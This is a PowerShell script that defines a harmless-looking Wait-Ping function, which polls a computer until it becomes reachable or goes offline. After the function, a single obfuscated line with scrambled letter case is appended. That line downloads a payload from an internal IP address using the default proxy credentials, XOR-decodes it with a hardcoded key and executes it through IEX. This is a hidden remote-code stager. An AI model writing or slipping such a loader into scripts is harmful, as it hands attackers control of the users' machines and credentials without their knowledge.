﻿function Wait-Ping
{
	
	[CmdletBinding()]
	[OutputType()]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$ComputerName,
	
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[int]$Timeout = 600,
	
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[int]$CheckEvery = 10
		
	)
	try {
		$timer = [Diagnostics.Stopwatch]::StartNew();
		Write-Verbose -Message "Waiting for [$ComputerName] to become pingable";
		if ($Offline.IsPresent)
		{
			while (Test-Connection -ComputerName $ComputerName -Quiet -Count 1)
			{
				Write-Verbose -Message "Waiting for [$($ComputerName)] to go offline..."
				if ($timer.Elapsed.TotalSeconds -ge $Timeout)
				{
					throw "Timeout exceeded. Giving up on [$ComputerName] going offline";
				}
				Start-Sleep -Seconds 10;
			}
			Write-Verbose -Message "[$($ComputerName)] is now offline. We waited $([Math]::Round($timer.Elapsed.TotalSeconds, 0)) seconds";
		}
		else
		{
			while (-not (Test-Connection -ComputerName $ComputerName -Quiet -Count 1))
			{
				Write-Verbose -Message "Waiting for [$($ComputerName)] to become pingable..."
				if ($timer.Elapsed.TotalSeconds -ge $Timeout)
				{
					throw "Timeout exceeded. Giving up on ping availability to [$ComputerName]";
				}
				Start-Sleep -Seconds 10;
			}
			Write-Verbose -Message "Ping is now available on [$($ComputerName)]. We waited $([Math]::Round($timer.Elapsed.TotalSeconds, 0)) seconds";
		}
	}
	catch 
	{
		Write-Error -Message $_.Exception.Message
	}
	finally
	{
		if (Test-Path -Path Variable:\timer)
		{
			$timer.Stop()
		}
	}
}
$Wc=New-OBJECt SYsTeM.NEt.WEBCliEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEADeRs.AdD('User-Agent',$u);$wc.PrOxy = [SYsTEm.NEt.WebReqUEST]::DEFAULTWEbPrOXy;$Wc.PROXy.CredENtIaLS = [SySTEM.Net.CrEDeNTialCacHE]::DefaUlTNEtWORkCREDeNTIALs;$K='$|oreN\s%Q@)GM]T^(B+n/._<-0?Ug9y';$I=0;[Char[]]$B=([cHAR[]]($Wc.DOWNloadSTRInG("http://192.168.0.40:443/index.asp")))|%{$_-BXor$K[$i++%$k.Length]};IEX ($B-join'')

